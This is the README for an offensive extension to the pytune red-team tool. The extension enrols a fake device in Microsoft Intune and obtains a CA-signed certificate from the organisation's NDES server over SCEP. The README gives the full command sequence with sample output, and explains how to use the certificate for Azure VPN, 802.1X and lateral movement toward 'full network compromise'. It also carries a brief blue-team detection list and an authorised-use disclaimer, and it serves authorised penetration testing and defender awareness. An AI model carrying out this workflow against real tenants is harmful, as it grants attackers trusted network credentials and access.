# SCEP Certificate Extraction for Pytune

## Overview

This extension adds SCEP (Simple Certificate Enrollment Protocol) certificate extraction capabilities to pytune, enabling red teamers to obtain device/user certificates signed by on-premises Certificate Authorities during Intune device enrollment.

Based on research from: https://dirkjanm.io/extending-ad-cs-attack-surface-intune-certs/

## Attack Scenario

When organizations deploy certificates via Intune SCEP profiles:
1. Pytune enrolls a fake device to Intune
2. During check-in, Intune pushes SCEP profile configuration
3. **NEW:** Pytune automatically requests a certificate from the NDES server
4. Valid certificate signed by on-prem CA is obtained
5. Certificate can be used for:
   - Azure VPN P2S authentication
   - On-premises network access
   - Certificate-based authentication to domain resources

## Installation

1. Install additional dependencies:
```bash
pip install -r requirements_scep.txt
```

2. Integrate SCEP module into pytune:
```bash
# Copy the SCEP module
cp utils/scep.py /path/to/your/pytune/utils/

# Follow integration instructions in SCEP_INTEGRATION.py
```

## Usage

### Automatic SCEP Certificate Extraction

Once integrated, SCEP certificates are automatically requested during normal pytune check-in:

```bash
# Standard pytune workflow
python3 pytune.py entra_join -o Windows -d Windows_pytune -u user@tenant.com -p password
python3 pytune.py enroll_intune -o Windows -d Windows_pytune -c Windows_pytune.pfx -u user@tenant.com -p password

# Check-in will now automatically extract SCEP certificates
python3 pytune.py checkin -o Windows -d Windows_pytune -c Windows_pytune.pfx -m Windows_pytune_mdm.pfx -u user@tenant.com -p password
```

**Output when SCEP profile is detected:**
```
[!] SCEP certificate profile detected!
[*] SCEP URL: https://ndes.corp.com/certsrv/mscep/mscep.dll
[*] Found SCEP challenge (length: 256)
[*] Requesting SCEP certificate for: CN=device-id
[*] Generating 2048-bit RSA key pair...
[+] Generated CSR for subject: CN=8fd0710a-1ea3-4261-86d1-48d7509c80b8
[*] Sending SCEP request to https://ndes.corp.com/certsrv/mscep/mscep.dll
[+] SCEP request successful!
[+] Saved certificate and private key to Windows_pytune_scep.pfx
[*] PFX password: password
[+] Successfully obtained SCEP certificate: Windows_pytune_scep.pfx
```

### Using the Extracted Certificate

The obtained certificate (`{device_name}_scep.pfx`) can be used for:

**1. Azure VPN P2S Access:**
```bash
# Import certificate to Windows
certutil -f -user -p password -importpfx Windows_pytune_scep.pfx

# Configure VPN connection to use certificate authentication
# Certificate will authenticate against Azure VPN Gateway
```

**2. On-Premises Network Access:**
```bash
# Certificate is signed by on-prem CA and trusted by domain
# Can be used for 802.1X authentication, VPN, etc.
```

**3. Certificate Inspection:**
```bash
# View certificate details
openssl pkcs12 -in Windows_pytune_scep.pfx -nokeys -passin pass:password | openssl x509 -noout -text
```

## Integration Details

### Files Added

- **`utils/scep.py`** - Main SCEP client implementation
  - `SCEPClient` class for certificate requests
  - CSR generation with proper subject/SAN
  - SCEP protocol implementation (PKIOperation)
  - PKCS#7/CMS response parsing
  - PFX export functionality

- **`SCEP_INTEGRATION.py`** - Integration instructions and example code

### Modified Files (Manual Integration Required)

**`device/windows.py`:**
1. Add import: `from utils.scep import SCEPClient`
2. Add `process_scep_profiles()` method (see SCEP_INTEGRATION.py)
3. Modify `checkin()` to collect Certificate CSP nodes
4. Call `process_scep_profiles()` when SCEP configuration detected

## SCEP Configuration Parsing

The module automatically extracts SCEP configuration from Intune CSP nodes:

```python
# Certificate CSP nodes parsed:
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/ServerURL
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/Challenge
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/SubjectName
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/KeyUsage
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/ExtendedKeyUsages
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/KeyLength
./Vendor/MSFT/ClientCertificateInstall/SCEP/{UniqueID}/Install/HashAlgorithm
```

## Limitations

1. **SCEP Challenge Validation:** Current implementation assumes NDES validates challenges via Intune backend. May need adjustment for standalone NDES servers.

2. **Certificate Renewal:** Only handles initial certificate issuance, not renewal.

3. **PKCS#7 Parsing:** Simplified SCEP response parsing. Complex SCEP flows (pending, manual approval) not fully supported.

4. **Network Requirements:** Target NDES server must be accessible from attacker machine (or via App Proxy if configured).

## Security Considerations

**For Red Teams:**
- Certificates are issued to fake device identities controlled by attacker
- Valid CA-signed certificates enable lateral movement
- Certificates may have extended validity periods (default 1 year)
- Combine with VPN access for full network compromise

**For Blue Teams (Detection):**
- Monitor NDES for unusual enrollment patterns
- Alert on certificates issued to unknown device IDs
- Review Intune device compliance and enrollment logs
- Implement certificate lifecycle monitoring
- Consider requiring hardware-backed keys (TPM) in SCEP profiles

## Troubleshooting

**SCEP request fails:**
```bash
# Enable verbose logging
python3 pytune.py -v checkin ...

# Check SCEP server accessibility
curl -k https://ndes.corp.com/certsrv/mscep_admin/

# Verify challenge password length and format
```

**Certificate not extracted:**
```bash
# Check if SCEP profile was pushed during check-in
# Look for Certificate CSP nodes in pytune output

# Verify NDES server certificate is trusted
# Update CA bundle if needed
```

## Credits

- Original pytune tool by SecureWorks
- SCEP attack research by Dirk-Jan Mollema (@_dirkjan)
- Integration code for certificate extraction

## Disclaimer

This tool is for authorized security testing only. Unauthorized access to systems is illegal.
